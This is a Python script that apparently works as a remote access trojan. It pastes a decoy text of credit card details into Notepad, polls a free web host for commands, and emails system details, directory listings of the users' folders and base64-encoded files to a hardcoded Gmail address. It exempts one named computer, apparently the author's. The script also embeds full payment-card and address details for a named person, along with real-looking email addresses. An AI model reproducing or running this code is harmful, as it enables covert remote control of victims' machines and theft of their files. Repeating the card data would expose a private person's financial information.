import base64
import os
import smtplib
import urllib.request
import platform
import time
import clipboard
import pyautogui
import subprocess
from email.mime.text import MIMEText

url = "http://rat-ansikte.000webhostapp.com/teal.txt"

bankaccountdetails = "dans credit card details!          Card Number: 5423423247525555     Exp: 5-21     CVV: 013          Adress: Front Street North 39, Buffalo, NY          Name: Daniel Jefferson     BIN: 542342     Issuing Bank: Great Plains F.C.U     Card Brand: Mastercard     Card Type: Credit          Country: United States     ISO Country number: 840          Bank Website: http://www.greatplainsfcu.com/     Bank Phonenumber: (417) 626-8500"

server = smtplib.SMTP("aspmx.l.google.com", 25)
currentInst = "no inst!"

newInst = ""

running = True

bannedComputer = "DESKTOP-71TI4QV"

def boot():
	global currentInst
	# open notepad

	# check computer name
	if platform.node() == bannedComputer:
		currentInst = "Wrong computer"
		shutdown()
		return
	
	subprocess.Popen("notepad.exe")
	time.sleep(0.2)
	clipboard.copy(bankaccountdetails)
	pyautogui.hotkey('ctrl', 'v')

	currentInst = "boot"
	sendData(info())

def shutdown():
	global running

	sendData("shutting down... :(")
	
	running = False

def sendData(str):
	global server

	msg = MIMEText(str)
	msg["Subject"] = currentInst
	msg["From"] = "kennyandersson77@gmail.com"
	msg["To"] = "jacob.2002.johansson@gmail.com"
	
	print("Sending mail!")
	server.sendmail("kennyandersson77@gmail.com", "jacob.2002.johansson@gmail.com", msg.as_string())
	
def toBase64(data):
	encode = base64.encodebytes(data)
	return encode.decode()

def getInst():
	global newInst

	req = urllib.request.Request(url, data=None, headers={"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36", "Pragma": "no-cache"})

	content = urllib.request.urlopen(req).read()
	content = content.decode()
	newInst = content.replace("\n", "")

def loop():
	global currentInst

	boot()

	while running:
		print("sleeping")
		time.sleep(5)

		getInst()

		print(newInst)

		if currentInst == newInst:
			print("same inst")
			continue
		
		print("New inst!")
		currentInst = newInst

		if "tree" in newInst:
			tree()
		elif "quit" in newInst:
			shutdown()
		else:
			getfile(newInst)

def tree():
	content = ""

	for root, dirs, files in os.walk("\\Users"):

		if "AppData" in root: # skip the appdata folder
			continue
		
		content += root + "\n"
		for f in files:
			content += f + "\n"
		content += "#" + "\n"
	
	b64 = toBase64(bytes(content, "utf8"))
	sendData(b64)

def getfile(dir):

	if os.path.exists(dir):
		file = open(dir, "rb")

		b64 = toBase64(file.read())
		sendData(b64)

		file.close()
	else:
		sendData("File doesn't exist!")
	
def info():
	content = ""
	data = platform.uname()

	content += "System: " + data.system + "\n"
	content += "Node: " + data.node + "\n"
	content += "Release: " + data.release + "\n"
	content += "Version: " + data.version + "\n"
	content += "Machine: " + data.machine + "\n"
	content += "Processor: " + data.processor

	return content

loop()